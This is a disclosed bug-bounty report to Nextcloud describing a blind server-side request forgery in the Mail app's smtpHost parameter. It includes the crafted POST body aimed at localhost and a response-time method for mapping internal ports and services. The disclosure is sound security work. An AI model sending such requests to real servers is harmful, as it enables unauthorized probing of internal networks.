# Mail app - blind SSRF via smtpHost parameter

## Report Details
- **Report ID**: 1746582
- **URL**: https://hackerone.com/reports/1746582
- **State**: Closed
- **Severity**: low
- **Submitted**: 2022-10-22T11:43:18.407Z
- **Disclosed**: 2023-02-06T21:28:29.483Z

## Reporter
- **Username**: supr4s
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nextcloud

## Vulnerability Information
Hi everyone,

I would like to report here a Blind SSRF vulnerability through the Nextcloud Mail application.

Tested on latest Mail release : `2.0.1`.

## Steps To Reproduce:

This is a similar report to report #1736390, but this time on a different parameter. The vulnerable parameter is `smtpHost`.

The only difference here is that you have to enter the correct settings for the IMAP part first. The server will first check if the IMAP parameters are correct, before checking the SMTP parameters and thus allowing us to use this SSRF blind.

The POST request in question : 

```
{"imapHost":"ssl0.ovh.net","imapPort":993,"imapSslMode":"ssl","imapUser":"redacted","imapPassword":"redacter","smtpHost":"127.0.0.1","smtpPort":8080,"smtpSslMode":"none","smtpUser":"xx","smtpPassword":"xx","accountName":"Test1","emailAddress":"xxx@xxx.org"}
```

This does not change afterwards, we can probe accessible IPs/open ports based on the response time : 

- For an accessible host/port: response time > 1000ms 
- For a closed port/host that does not exist: response time < 100ms

{{F1998975}}

```
Port 80 - response time : 5200ms - Apache2 service
Port 443 - response time : 5200ms - Apache2 service
Port 8080 - response time 5140ms - CrowdSec
Port 6060 - response time 5180ms - CrowdSec
Port 5432 - response time 5191ms -  PostgreSQL
Port 6379 - response time 5216ms - My Redis instance for Nextcloud
```

## Impact

From [OWASP](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/) :

> SSRF flaws occur whenever a web application is fetching a remote resource without validating the user-supplied URL. It allows an attacker to coerce the application to send a crafted request to an unexpected destination, even when protected by a firewall, VPN, or another type of network access control list (ACL).

This vulnerability can be exploited by any user, regardless of their rights, as long as the mail application is installed and enabled. A malicious person can therefore retrieve the services running locally on the server, scan your internal network for interesting information about which IPs are responding, which services are running on each IP address, etc.

Regards,
Supr4s

## Attachments
- Capture_d__cran_du_2022-10-15_22-53-34.png
